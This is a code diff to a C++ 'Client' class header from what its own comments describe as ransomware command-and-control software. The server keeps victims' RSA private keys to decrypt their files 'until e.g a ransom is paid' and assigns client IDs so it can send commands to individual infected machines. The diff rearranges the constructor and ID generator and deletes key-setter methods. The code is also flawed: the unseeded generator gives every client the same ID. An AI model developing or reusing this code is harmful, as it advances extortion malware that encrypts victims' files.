@@ -20,9 +20,28 @@ public:
     BOOL          SocketReady(SocketTypes type) const;
 
 #ifdef SERVER_RELEASE
+    
+    Client() = default;
+    Client(sockaddr_in addr)
+        : ClientUID(GenerateCUID()), // generate a cuid when a client is created on the server
+        ExpectingResponse(FALSE), AddressInfo(addr)
+    {
+    }
 
-    /* 
-        The rsa private key used to decrypt encrypted files with 
+    inline long GenerateCUID() {
+        std::default_random_engine generator;
+        std::uniform_int_distribution<long> dist(1, 10400);
+        return dist(generator);
+    }
+
+    /*
+        UID is assigned by the server .Used to perform commands on one client.
+        Only used on the server. On client, will always remain - 1.
+    */
+    long          ClientUID = -1;
+
+    /*
+        The rsa private key used to decrypt encrypted files with
         client public rsa key. only on server until e.g a ransom is paid
     */
     std::string    RSAPrivateKey;
@@ -41,38 +60,6 @@ public:
     ClientResponse RecentClientResponse;
     ClientResponse LastClientResponse;
 
-    /*
-        UID is assigned by the server .Used to perform commands on one client.
-        Only used on the server. On client, will always remain - 1.
-    */
-    long          ClientUID = -1;
-
-    inline long   GenerateCUID() {
-        std::default_random_engine generator;
-        std::uniform_int_distribution<long> dist(1, 10400);
-        return dist(generator);
-    }
-
-    inline void   SetClientTCPSocket(SOCKET fd) {
-        this->TCPSocket = fd;
-    }
-
-    inline void   SetClientID(long cuid) {
-        this->ClientUID = cuid;
-    }
-
-    inline void   SetAESKey(std::string key) {
-        this->AESEncryptionKey = key;
-    }
-
-    inline void   SetPrivateRSAKey(std::string key) {
-        this->RSAPrivateKey = key;
-    }
-
-    inline void   SetPublicRSAKey(std::string key) {
-        this->RSAPublicKey = key;
-        SetAESKey(key); // rsa public key is same as aes key
-    }
 
 #elif defined(CLIENT_RELEASE)
     Client(); // dynamically load winsock and put it in loaded dlls
